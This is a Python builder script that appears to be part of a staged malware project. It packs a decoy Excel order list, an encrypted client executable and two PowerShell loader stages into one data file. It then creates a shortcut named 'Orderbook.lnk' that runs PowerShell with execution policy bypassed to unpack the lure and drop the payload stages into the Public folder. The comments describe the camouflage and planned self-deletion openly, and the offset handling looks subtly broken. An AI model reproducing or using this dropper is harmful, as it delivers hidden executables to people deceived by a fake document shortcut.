import os
import sys
import hashlib
from win32com.client import Dispatch
from typing import List, Dict

def compress_powershell_script(script_content: str) -> str:
    """
    Compress the PowerShell script content into a single line
    while maintaining its original functionality.
    """
    lines = script_content.splitlines()

    # Remove lines starting with `#` and strip extra whitespace
    code_lines = [line.strip() for line in lines if not line.strip().startswith("#")]
    code_lines = list(filter(None, code_lines))

    # Combine lines intelligently
    # If a line already ends with ';', do not add another
    oneliner = []
    for line in code_lines:
        if line.endswith(";"):
            oneliner.append(line)
        else:
            oneliner.append(line + ";")

    # Join all parts into a single line, ensuring proper spacing
    return " ".join(oneliner)

def create_dummy_data_file(data_paths: List[str], output_path: str) -> Dict[str, int]:
    """
    Create a dummy data file that stores arbitrary data in the specified paths.
    Concatenates the contents of the files listed in data_paths and writes to output_path.
    Returns a dictionary of offsets in bytes for each file in the output file.
    """
    offsets = {}
    current_offset = 0

    try:
        with open(output_path, "wb") as f:
            for data_path in data_paths:
                abs_data_path = os.path.abspath(data_path)
                if not os.path.isfile(abs_data_path):
                    print(f"Warning: {abs_data_path} does not exist and will be skipped.")
                    continue
                with open(abs_data_path, "rb") as data_file:
                    print(f"Writing {abs_data_path} to {output_path} at offset {current_offset}")
                    data = data_file.read()
                    f.write(data)
                    current_offset += len(data)
                    offsets[data_path] = current_offset
    except Exception as e:
        print(f"Error while creating dummy data file: {e}")
        sys.exit(1)

    return offsets

def create_lnk_shortcut(shortcut_path: str, target_path: str, arguments: str = '',
                        working_directory: str = '', icon_path: str = ''):
    """
    Creates a Windows shortcut (.lnk file).

    :param shortcut_path: Full path where the shortcut will be created.
    :param target_path: The executable or script the shortcut points to.
    :param arguments: Command-line arguments for the target.
    :param working_directory: The working directory for the shortcut.
    :param icon_path: Path to the icon file for the shortcut.
    """
    try:
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = target_path
        shortcut.Arguments = arguments
        print(f"shortcut.TargetPath: {shortcut.TargetPath}")
        print(f"shortcut.Arguments: {shortcut.Arguments}")
        shortcut.WorkingDirectory = working_directory if working_directory else os.path.dirname(target_path)
        if icon_path:
            shortcut.IconLocation = icon_path
        shortcut.save()
        print(f"Shortcut created at: {shortcut_path}")
    except Exception as e:
        print(f"Failed to create shortcut: {e}")
        sys.exit(1)

def get_powershell_path() -> str:
    """
    Retrieves the path to the PowerShell executable.
    """
    system_root = os.environ.get('SystemRoot', 'C:\\Windows')
    potential_paths = [
        os.path.join(system_root, 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe'),
        os.path.join(system_root, 'SysWOW64', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
    ]
    for path in potential_paths:
        if os.path.isfile(path):
            return path
    print("PowerShell executable not found.")
    sys.exit(1)

if __name__ == "__main__":
    ## Step 1: Create the dummy data
    # Define data paths (use absolute paths for reliability)
    data_paths = [
        os.path.abspath("../asset/KnightShopOrderList.xlsx"),      #           Benign Excel file
        os.path.abspath("../../client/dist/client_encrypted.exe"), #           Encrypted client executable
        os.path.abspath("../scripts/find.ps1"),                    # (Stage 2) PowerShell script to decrypt the client executable
        os.path.abspath("../scripts/search.dat"),                  # (Stage 3) PowerShell script camouflaged as a data file, invoked by Stage 2
    ]
    output_path = os.path.abspath("dummy_data.bin")
    offsets = create_dummy_data_file(data_paths, output_path)

    # Calculate the MD5 hash of the dummy data file
    with open(output_path, "rb") as f:
        dummy_data = f.read()
        md5_hash = hashlib.md5(dummy_data).hexdigest()

    # Ensure that the required files were written
    if not os.path.isfile(output_path):
        print(f"Error: {output_path} was not created.")
        sys.exit(1)

    ## Step 2: Create the PowerShell script
    # Injected PowerShell Script Content
    # TODO: At last, the lnk file should be self-deleted for clearance as well as the dummy file
    ps1_content = f"""
# Self-discovery to find the location of the shortcut(this)
$target = 'Orderbook.lnk'
$searchDir = $env:USERPROFILE
$lnk = Get-ChildItem -Path $searchDir -Recurse -Filter $target -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DirectoryName

if (-not $lnk) {{
    # Unable to proceed
    exit -1
}}

# Ensure that the dummy data file also exists in the current position and hash check
$dummy = Join-Path $lnk 'dummy_data.bin'
$md5 = (Get-FileHash -Path $dummy -Algorithm MD5).Hash
if ($md5 -ne '{md5_hash}') {{
    # Unable to proceed
    exit -1
}}

# Extract the data from the dummy data
$fs = [System.IO.File]::OpenRead($dummy)
$br = New-Object System.IO.BinaryReader($fs)

# (1) Benign excel file
$f1 = Join-Path $lnk 'Order.xlsx'
$f1d = $br.ReadBytes({offsets[data_paths[0]]})
[System.IO.File]::WriteAllBytes($f1, $f1d)

# (2) Encrypted client executable
$pub = $env:public
$f2 = Join-Path $pub 'c.exe.e'
$f2d = $br.ReadBytes({offsets[data_paths[1]]})
[System.IO.File]::WriteAllBytes($f2, $f2d)

# (3) find.ps1, which is the PowerShell script to decrypt the client executable
$f3 = Join-Path $pub 'fd.ps1'
$f3d = $br.ReadBytes({offsets[data_paths[2]]})
[System.IO.File]::WriteAllBytes($f3, $f3d)

# (4) search.dat, which is the data file for the find.ps1 script
$f4 = Join-Path $pub 'search.dat'
$f4d = $br.ReadBytes({offsets[data_paths[3]]})
[System.IO.File]::WriteAllBytes($f4, $f4d)

$br.Close()
$fs.Close()
"""

    # Compress the PowerShell script
    compressed_ps1 = compress_powershell_script(ps1_content)

    ## Step 3: Create the lnk shortcut file to deliver the payload
    # Create the lnk shortcut file
    try:
        current_directory = os.path.dirname(os.path.abspath(__file__))
    except NameError:
        current_directory = os.getcwd()

    shortcut_name = "Orderbook.lnk"
    shortcut_path = os.path.join(current_directory, shortcut_name)
    powershell_path = get_powershell_path()
    arguments = f'-ExecutionPolicy Bypass -NoExit -Command "{compressed_ps1}"'
    working_directory = current_directory
    icon_path = powershell_path 

    # Create the lnk file shortcut
    create_lnk_shortcut(
        shortcut_path=shortcut_path,
        target_path=powershell_path,
        arguments=arguments,
        icon_path=icon_path
    )